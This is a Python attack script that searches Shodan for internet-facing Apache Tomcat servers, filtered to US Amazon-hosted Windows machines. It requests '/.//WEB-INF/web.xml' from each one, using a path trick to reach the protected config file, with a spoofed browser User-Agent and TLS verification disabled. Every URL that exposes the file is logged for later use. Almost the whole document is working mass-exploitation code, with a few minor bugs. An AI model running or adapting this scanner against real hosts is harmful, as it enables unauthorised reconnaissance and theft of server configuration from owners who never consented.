#!/usr/bin/env python
#
# tomcat.py
# Search SHODAN for Tomcat Exposed Web.xml
#
# Author: random_robbie

import shodan
import sys
import re
import requests
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "YOUR APIKEY"
SEARCH_FOR = 'country:"US" org:"Amazon.com" product:"Apache Tomcat/Coyote JSP engine" os:"Windows 7 or 8"'
FILE = "/.//WEB-INF/web.xml"
session = requests.Session()

def filter_result(str):
	str.strip() #trim
	str.lstrip() #ltrim
	str.rstrip() #rtrim
	return str

def grab_file (IP,PORT,FILE):
	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		
		URL = "http://"+IP+":"+PORT+""+FILE+""
		if PORT == "443":
			URL = "http://"+IP+":"+PORT+""+FILE+""
		if PORT == "8443":
			URL = "http://"+IP+":"+PORT+""+FILE+""
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
		response = session.get(URL, headers=headers, timeout=10, verify=False)
		if 'web-app' in response.text:
			if 'java.sun.com' in response.text:
				text_file = open("./cfg/tomcat.cfg", "a")
				text_file.write(""+URL+"\n")
				text_file.close()
				print ("[*] Web.xml... Found [*]\n")
				print (result)
		else:
			print ("[*] Not Vulnerable [*]\n ")
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		print (e)
		print ("[*] Nothing Found on IP: "+IP+" [*]\n")
	



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR,limit=None)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				grab_file (IP,PORT,FILE)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
